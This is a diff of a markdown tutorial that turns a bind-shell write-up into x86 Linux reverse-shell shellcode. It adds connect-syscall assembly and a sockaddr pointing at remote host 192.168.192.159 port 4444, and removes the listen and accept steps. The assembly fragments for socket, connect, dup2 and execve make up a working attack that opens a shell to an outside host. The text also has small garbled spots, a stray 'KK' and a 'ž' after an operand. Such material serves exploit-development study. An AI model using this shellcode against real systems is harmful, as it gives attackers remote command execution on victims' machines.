@@ -71,16 +71,15 @@ Syscall               Dec   Hex
 #define __NR_execve   11    0xB
 ```
 
-Each syscall and its arguments are defined in man 2 pages in form of C function. In order to find out which argments are needed we need to look at man pages. 
-Based on man 2 pages for socket syscall (`man 2 socket`) we can see the three arguments that need to be passed to syscall.
+Each syscall and its arguments are defined in man 2 pages in form of C function. In order to find out which argments are needed we need to look at man pages (`man 2 socket`). 
 
 ```
 int socket(int domain, int type, int protocol);
 ```
-|socket()  creates an endpoint for communication and returns a file descriptor that refers to that endpoint.  
-|The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>.  
-|The socket has the indicated type, which specifies the communication semantics.  
-|The protocol specifies a particular protocol to be used with the socket.  Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
+> socket()  creates an endpoint for communication and returns a file descriptor that refers to that endpoint.  
+> The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.  These families are defined in <sys/socket.h>.  
+> The socket has the indicated type, which specifies the communication semantics.  
+> The protocol specifies a particular protocol to be used with the socket.  Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
   
 Arguments are passed via registers in following order; EAX, EBX, ECX, EDX, ESI, EDI. EAX always contains syscall number (in case of socket it is decimal 359 or hex 0x167). 
 The domain, type and protocol needs to be passed in EBX, ECX and EDX registers.
@@ -175,20 +174,21 @@ Next step is to prepare registers for accept syscall. According to `man 2 connec
 ```
 int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ```
-| The  connect() system call connects the socket referred to by the file descriptor sockfd to the address specified by addr. The addrlen argument specifies the size of addr.  The format of the address in addr is determined by the address space of the socket sockfd; see socket(2) for further details.
-| If the socket sockfd is of type SOCK_DGRAM, then addr is the address to which datagrams are sent by default, and the only address from which datagrams are received.   If  the  socket  is  of type SOCK_STREAM or SOCK_SEQPACKET, this call attempts to make a connection to the socket that is bound to the address specified by addr.
-| Generally, connection-based protocol sockets may successfully connect() only once; connectionless protocol sockets may use  connect()  multiple  times  to change  their  association.   Connectionless sockets may dissolve the association by connecting to an address with the sa_family member of sockaddr set to AF_UNSPEC (supported on Linux since kernel 2.2).
+> The  connect() system call connects the socket referred to by the file descriptor sockfd to the address specified by addr. The addrlen argument specifies the size of addr.  The format of the address in addr is determined by the address space of the socket sockfd; see socket(2) for further details.
+> If the socket sockfd is of type SOCK_DGRAM, then addr is the address to which datagrams are sent by default, and the only address from which datagrams are received.   If  the  socket  is  of type SOCK_STREAM or SOCK_SEQPACKET, this call attempts to make a connection to the socket that is bound to the address specified by addr.
+> Generally, connection-based protocol sockets may successfully connect() only once; connectionless protocol sockets may use  connect()  multiple  times  to change  their  association.   Connectionless sockets may dissolve the association by connecting to an address with the sa_family member of sockaddr set to AF_UNSPEC (supported on Linux since kernel 2.2).
+> addrlen specifies the size, in bytes, of the address structure pointed to by addr.
 
-
-
-KKaddrlen specifies the size, in bytes, of the address structure pointed to by addr.
-
-In a same way as for socket syscall we need to prepare data for bind bind syscall with exception that bind is using struct sockaddr which needs to be saved on the stack. 
-In order to place some value on the stack PUSH instraction needs to be used. 
-Since stack grows from higher addresses to lower addresses, last argument needs to be pushed first and due to little endian format values needs to be pushed in reverse order. 
+First we need to clear EAX register so that we can place a syscall number (0x16A) in it.
 
 ```
-server.sin_addr.s_addr = htonl("192.168.192.159"); // any address (0.0.0.0)
+XOR EAX, EAX
+MOV AX, 0x16A
+```
+
+Then we need to push struct on the stack. Since stack grows from higher addresses to lower addresses, last argument needs to be pushed first and due to little endian format values needs to be pushed in reverse order. 
+```
+server.sin_addr.s_addr = htonl("192.168.192.159"); // remote host IP address
 server.sin_port = htons(4444);                     // port 4444
 server.sin_family = AF_INET;                       // address family (ip v4)
 ```
@@ -207,52 +207,11 @@ Once we have struct placed on the stack we can write assembly code for bind sysc
 
 ```
 MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
-MOV EAX, 0x169   ; move bind syscall number in EAX register
 MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
 MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
 INT 0x80         ; interrupt
 ```
 
-In the same way listen syscall can be written in assembly.
-```
-int listen(int sockfd, int backlog);
-```
-listen() marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept(2).
-The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET.
-The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.  
-
-From prototype code we can see backlog is set to 2: `listen(socketd, 2)` and sockfd is result of socket syscall currently located in EDI register.
-
-```
-XOR EAX, EAX     ; set EAX to zero
-MOV AX, 0x16B    ; move 0x16B to (E)AX
-MOV EBX, EDI     ; move socket descriptor into EBX as first argument
-MOV CL,  0x2     ; move "2" as backlog into ECX as second argument
-INT 0x80         ; interrupt
-```
-
-Now when we have socket, bind and listen, next we need to accept connection. From `man 2 accept` we can see which arguments need to be passed to syscall.
-```
-int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-```
-
-The accept() system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET). 
-It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.  
-The newly created socket is not in the listening state.  
-
-```
-XOR EAX, EAX     ; set EAX to zero for clean start
-MOV AX, 0x16C    ; move accept syscall number (0x16C) in (E)AX
-MOV EBX, EDI     ; move socket descriptor from EDI to EBX as first argument
-XOR ECX, ECX     ; set ECX to zero as argument is NULL
-XOR EDX, EDX     ; set EDX to zero as argument is NULL
-XOR ESI, ESI     ; set flag to 0 by XOR-ing
-INT 0x80         ; interrupt
-
-XOR EDI, EDI     ; set EDI to zero
-MOV EDI, EAX     ; As result, new socket descriptor will be saved in EAX 
-                 ; so we can move it to EDI for further use.
-```
 
 Almost there.. next we need to call dup2 syscall with following arguments:
 ```
@@ -324,7 +283,7 @@ MOV AL, 0x0Bž
 INT 0x80
 ```
 
-## Bind shell code ##
+## Reverse shell code ##
 
 So when we put it all together and add sections and entry point the result is following:
 
